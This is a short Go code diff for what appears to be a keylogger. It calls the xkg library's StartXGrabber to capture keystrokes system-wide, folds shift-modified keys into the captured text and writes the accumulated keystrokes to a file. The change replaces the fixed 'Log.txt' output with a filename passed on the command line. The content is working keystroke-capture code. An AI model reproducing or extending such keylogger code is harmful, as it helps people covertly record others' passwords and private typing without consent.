@@ -4,10 +4,13 @@ package main
 import "github.com/LuccaPrado/xkg"
 import "io/ioutil"
 import "strings" 
+import "os"
 
 var armazenar, nova string
 
 func main() {
+	
+	nome := os.Args[1]
     var keys = make(chan int, 100)
 	
     go xkg.StartXGrabber(keys)
@@ -167,7 +170,8 @@ func main() {
 				nova = strings.Replace(armazenar, "<shift>"+key, strings.ToUpper(key), -1)
 				armazenar = nova
 				}
-            ioutil.WriteFile("Log.txt", []byte(armazenar), 0777)
+				
+            ioutil.WriteFile(nome, []byte(armazenar), 0777)
         }
        
     }
